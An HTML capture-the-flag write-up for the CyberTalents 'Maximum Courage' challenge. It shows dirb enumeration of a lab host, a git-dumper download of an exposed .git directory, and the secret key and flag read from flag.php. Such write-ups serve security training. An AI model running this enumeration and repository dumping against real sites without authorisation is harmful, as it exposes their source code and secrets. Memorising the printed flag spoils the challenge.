@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Maximum Courage - CTF Writeup | SenyX122</title>
+<link href="https://fonts.googleapis.com/css2?family=Inconsolata&display=swap" rel="stylesheet">
+<style>
+    body {
+        margin: 0;
+        font-family: 'Inconsolata', monospace;
+        background: #0f0f0f;
+        color: #ccc;
+        padding: 40px;
+        max-width: 800px;
+        margin: auto;
+    }
+    h1, h2 {
+        color: #00ff88;
+        border-bottom: 1px dashed #333;
+        padding-bottom: 5px;
+    }
+    code, pre {
+        background: #111;
+        color: #00d4ff;
+        padding: 8px;
+        border-radius: 6px;
+        display: block;
+        overflow-x: auto;
+        margin: 15px 0;
+    }
+    a {
+        color: #00d4ff;
+        text-decoration: none;
+    }
+    a:hover {
+        color: #ff4081;
+    }
+    footer {
+        text-align: center;
+        margin-top: 60px;
+        font-size: 0.9em;
+        color: #555;
+    }
+</style>
+</head>
+<body>
+
+<h1>CyberTalents CTF - Maximum Courage</h1>
+
+<h2>Challenge Description</h2>
+<p><em>Recover the sensitive data from the exposed .git directory.</em><br>
+<strong>Find the flag hidden inside the repository.</strong></p>
+
+<h2>Target</h2>
+<pre>http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com</pre>
+
+<h2>Recon & Enumeration</h2>
+<h3>dirb scan</h3>
+<pre>
+dirb http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com/
+</pre>
+
+<p><strong>Results:</strong></p>
+<pre>
+http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com/.git/HEAD                     
+http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com/.git/
+http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com/flag.php
+</pre>
+
+<h3>Dumping .git directory</h3>
+<p>Used <code>git-dumper</code> to download the repository:</p>
+<pre>
+python3 git_dumper.py \
+http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com/.git/ \
+./output
+</pre>
+
+<h3>Reviewing files</h3>
+<pre>
+cd output
+ls -la
+</pre>
+
+<p>Found:</p>
+<pre>
+flag.php
+index.php
+.git/
+</pre>
+
+<h2>Extracting the Flag</h2>
+<p>Read the contents of <code>flag.php</code>:</p>
+<pre>
+You can't view this flag directly.
+<!-- PHP source doesn't appear on HTML comments -->
+&lt;?php
+exit();
+die();
+$secret_key = 'be607453caada6a05d00c0ea0057f733';
+?&gt;
+</pre>
+
+<h2>Flag</h2>
+<pre>be607453caada6a05d00c0ea0057f733</pre>
+
+<h2>🛠 Tools Used</h2>
+<ul>
+    <li><strong>dirb</strong></li>
+    <li><strong>git-dumper</strong></li>
+</ul>
+
+<h2>Summary</h2>
+<table style="width:100%; border-collapse:collapse;">
+    <tr style="border-bottom:1px dashed #333;">
+        <td>Target</td>
+        <td>http://wcamxwl32pue3e6meg23gmgi834kp6v4wp82ixzg-web.cybertalentslabs.com</td>
+    </tr>
+    <tr style="border-bottom:1px dashed #333;">
+        <td>Discovered</td>
+        <td>.git directory exposed</td>
+    </tr>
+    <tr>
+        <td>Flag</td>
+        <td>be607453caada6a05d00c0ea0057f733</td>
+    </tr>
+</table>
+
+<footer>
+    &copy; 2025 SenyX122 | Maximum Courage
+</footer>
+
+</body>
+</html>
